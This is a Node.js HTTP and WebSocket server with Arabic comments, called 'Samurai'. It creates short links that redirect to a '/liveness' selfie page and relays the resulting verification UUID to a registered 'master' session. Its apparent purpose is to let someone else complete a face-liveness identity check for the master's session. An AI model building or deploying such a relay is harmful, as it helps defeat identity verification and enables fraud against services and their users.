const WebSocket = require('ws');
const http = require('http');

// 🔥 التعديل الأهم لريلواي: يجب استخدام البورت الذي يمنحه السيرفر، أو 8080 كاحتياطي
const PORT = process.env.PORT || 8080;

// تخزين اتصالات الماستر: المفتاح هو رقم الجلسة (Session ID)
const masters = {}; 

// قاعدة بيانات مصغرة في الذاكرة لحفظ الروابط الطويلة (سريعة جداً)
const sessionsDB = {}; 

const server = http.createServer((req, res) => {
    // إعدادات CORS للسماح بالاتصال من أي مصدر
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

    // ==========================================
    // 1. نظام الروابط القصيرة (توليد وتوجيه واسترجاع)
    // ==========================================
    
    // أ) توليد الرابط القصير (تطلبه إضافة الماستر)
    if (req.method === 'POST' && req.url === '/shorten') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                if (data.session) {
                    const shortId = Math.random().toString(36).substring(2, 8);
                    sessionsDB[shortId] = data.session;
                    
                    const host = req.headers['x-forwarded-host'] || req.headers.host;
                    const protocol = req.headers['x-forwarded-proto'] || 'https';
                    const shortUrl = `${protocol}://${host}/s/${shortId}`;
                    
                    console.log(`🔗 [LINK SHORTENED] ID: ${shortId}`);
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ shortUrl: shortUrl }));
                } else {
                    res.writeHead(400); res.end(JSON.stringify({ error: "Missing session data" }));
                }
            } catch (e) {
                res.writeHead(400); res.end(JSON.stringify({ error: "Invalid JSON payload" }));
            }
        });
        return;
    }

    // ب) استرجاع الرابط الطويل في الخلفية
    if (req.method === 'POST' && req.url === '/resolve') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const longSession = sessionsDB[data.short_id]; 
                
                if (longSession) {
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ session: longSession }));
                } else {
                    res.writeHead(404, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: "Not found" }));
                }
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: "Invalid JSON" }));
            }
        });
        return;
    }

    // ج) فتح الرابط القصير بشكل مباشر
    if (req.method === 'GET' && req.url.startsWith('/s/')) {
        const shortId = req.url.split('/')[2]; 
        const longSession = sessionsDB[shortId]; 
        
        if (longSession) {
            res.writeHead(302, { 'Location': `/liveness?session=${encodeURIComponent(longSession)}` });
            res.end();
        } else {
            res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end('<h2 style="text-align:center; margin-top:50px; font-family:sans-serif; color:red;">الرابط غير صالح أو انتهت صلاحيته</h2>');
        }
        return;
    }

    // ==========================================
    // 2. منطق السيلفي وصفحة العميل
    // ==========================================

    if (req.method === 'GET' && req.url.startsWith('/liveness')) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        res.end('<html><head><title>Samurai Secure</title></head><body id="samurai-canvas"></body></html>');
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => { body += chunk.toString(); });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const targetSession = data.session_id; 

                if (targetSession && masters[targetSession]) {
                    const masterWs = masters[targetSession];
                    
                    if (masterWs.readyState === WebSocket.OPEN) {
                        let messageToMaster = null;

                        if (data.type) {
                            messageToMaster = { type: data.type, reason: data.reason || null };
                            console.log(`📢 [EVENT] ${data.type} for Session: ${targetSession.substring(0, 10)}...`);
                        } 
                        else if (data.payload) {
                            const decoded = Buffer.from(data.payload, 'base64').toString();
                            const jsonPayload = JSON.parse(decoded);
                            const uuid = jsonPayload.result;

                            messageToMaster = { type: 'UUID_RECEIVED', uuid: uuid };
                            console.log(`🚀 [SUCCESS] UUID Received for Session: ${targetSession.substring(0, 10)}...`);
                        }

                        if (messageToMaster) {
                            masterWs.send(JSON.stringify(messageToMaster));
                            res.writeHead(200, { 'Content-Type': 'application/json' });
                            res.end(JSON.stringify({ success: true, forwarded: true }));
                            return;
                        }
                    } else {
                        console.log("⚠️ Master socket exists but is not open.");
                    }
                } else {
                    console.log(`❌ No active Master for session: ${targetSession?.substring(0, 10)}...`);
                }

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, message: "No master to receive data" }));

            } catch (e) {
                console.error("Payload Error:", e);
                res.writeHead(400); res.end();
            }
        });
        return;
    }

    res.writeHead(200); res.end('Samurai Multi-User Server is UP and Running 🥷');
});

const wss = new WebSocket.Server({ server });

wss.on('connection', (ws) => {
    let mySessionId = null;

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'REGISTER_MASTER' && data.session_id) {
                mySessionId = data.session_id;
                masters[mySessionId] = ws;
                console.log(`👨‍💻 [MASTER REGISTERED] ID: ${mySessionId.substring(0, 15)}...`);
            }
        } catch(e) { console.error("WS Error:", e); }
    });

    ws.on('close', () => {
        if (mySessionId && masters[mySessionId]) {
            delete masters[mySessionId];
            console.log(`🔌 [MASTER DISCONNECTED] Room ${mySessionId.substring(0, 10)}... cleaned.`);
        }
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SAMURAI SERVER RUNNING ON PORT ${PORT}`);
});
